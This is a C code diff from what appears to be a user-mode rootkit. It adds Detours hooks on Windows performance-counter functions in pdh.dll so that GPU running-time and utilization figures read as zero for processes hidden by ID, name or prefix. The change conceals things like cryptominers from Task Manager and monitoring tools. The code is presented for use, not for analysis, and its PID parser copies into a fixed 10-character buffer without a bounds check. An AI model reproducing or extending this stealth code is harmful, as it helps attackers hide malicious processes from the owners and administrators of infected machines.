@@ -18,6 +18,8 @@ static NT_ENUMSERVICEGROUPW OriginalEnumServiceGroupW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
 static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
 static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
+static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
+static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 
 VOID InitializeHooks()
 {
@@ -33,6 +35,8 @@ VOID InitializeHooks()
 	InstallHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
+	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
+	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	DetourTransactionCommit();
 
 	// Usually, ntdll.dll should be the only DLL to hook.
@@ -55,6 +59,8 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
 	UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
 	UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
+	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
+	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	DetourTransactionCommit();
 }
 
@@ -478,6 +484,70 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 
 	return status;
 }
+static PDH_STATUS WINAPI HookedPdhGetRawCounterArrayW(PDH_HCOUNTER counter, LPDWORD bufferSize, LPDWORD itemCount, PPDH_RAW_COUNTER_ITEM_W itemBuffer)
+{
+	PDH_STATUS status = OriginalPdhGetRawCounterArrayW(counter, bufferSize, itemCount, itemBuffer);
+
+	if (status == ERROR_SUCCESS && itemCount)
+	{
+		DWORD infoBufferSize = 0;
+		if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, NULL) == PDH_MORE_DATA)
+		{
+			PPDH_COUNTER_INFO_W info = (PPDH_COUNTER_INFO_W)NEW_ARRAY(BYTE, infoBufferSize);
+			if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, info) == ERROR_SUCCESS)
+			{
+				if (!StrCmpW(info->szFullPath, L"\\GPU Engine(*)\\Running Time"))
+				{
+					for (DWORD i = 0; i < *itemCount; i++)
+					{
+						if (GetIsHiddenFromPdhString(itemBuffer[i].szName))
+						{
+							itemBuffer[i].RawValue.FirstValue = 0;
+							itemBuffer[i].RawValue.SecondValue = 0;
+							itemBuffer[i].RawValue.MultiCount = 0;
+						}
+					}
+				}
+			}
+
+			FREE(info);
+		}
+	}
+
+	return status;
+}
+static PDH_STATUS WINAPI HookedPdhGetFormattedCounterArrayW(PDH_HCOUNTER counter, DWORD format, LPDWORD bufferSize, LPDWORD itemCount, PPDH_FMT_COUNTERVALUE_ITEM_W itemBuffer)
+{
+	PDH_STATUS status = OriginalPdhGetFormattedCounterArrayW(counter, format, bufferSize, itemCount, itemBuffer);
+
+	if (status == ERROR_SUCCESS && itemCount)
+	{
+		DWORD infoBufferSize = 0;
+		if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, NULL) == PDH_MORE_DATA)
+		{
+			PPDH_COUNTER_INFO_W info = (PPDH_COUNTER_INFO_W)NEW_ARRAY(BYTE, infoBufferSize);
+			if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, info) == ERROR_SUCCESS)
+			{
+				if (!StrCmpW(info->szFullPath, L"\\GPU Engine(*)\\Utilization Percentage"))
+				{
+					for (DWORD i = 0; i < *itemCount; i++)
+					{
+						if (GetIsHiddenFromPdhString(itemBuffer[i].szName))
+						{
+							itemBuffer[i].FmtValue.longValue = 0;
+							itemBuffer[i].FmtValue.doubleValue = 0;
+							itemBuffer[i].FmtValue.largeValue = 0;
+						}
+					}
+				}
+			}
+
+			FREE(info);
+		}
+	}
+
+	return status;
+}
 
 static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime)
 {
@@ -672,4 +742,59 @@ static VOID FilterEnumServiceStatusProcess(LPENUM_SERVICE_STATUS_PROCESSW servic
 			i--;
 		}
 	}
+}
+static BOOL GetIsHiddenFromPdhString(LPCWSTR str)
+{
+	// Parses a process ID from this type of string:
+	// "pid_1234_luid_0x00000000_0x0000C9DE_phys_0_eng_0_engtype_3D"
+	// ... and determines whether the PID is hidden
+
+	DWORD processId = GetProcessIdFromPdhString(str);
+	if (processId)
+	{
+		BOOL hidden = FALSE;
+
+		if (IsProcessIdHidden(processId))
+		{
+			return TRUE;
+		}
+		else
+		{
+			WCHAR processName[MAX_PATH + 1];
+			if (GetProcessFileName(processId, FALSE, processName, MAX_PATH))
+			{
+				if (HasPrefix(processName) || IsProcessNameHidden(processName))
+				{
+					return TRUE;
+				}
+			}
+		}
+	}
+
+	return FALSE;
+}
+static DWORD GetProcessIdFromPdhString(LPCWSTR str)
+{
+	// Parses a process ID from this type of string:
+	// "pid_1234_luid_0x00000000_0x0000C9DE_phys_0_eng_0_engtype_3D"
+
+	LPWSTR name = str;
+
+	if (!StrCmpNW(name, L"pid_", 4))
+	{
+		name = &name[4];
+		PWSTR endIndex = StrStrW(name, L"_");
+		if (endIndex)
+		{
+			WCHAR pidString[10];
+
+			DWORD strLength = endIndex - name;
+			i_wmemcpy(pidString, name, strLength);
+			pidString[strLength] = L'\0';
+
+			return StrToIntW(pidString);
+		}
+	}
+
+	return 0;
 }
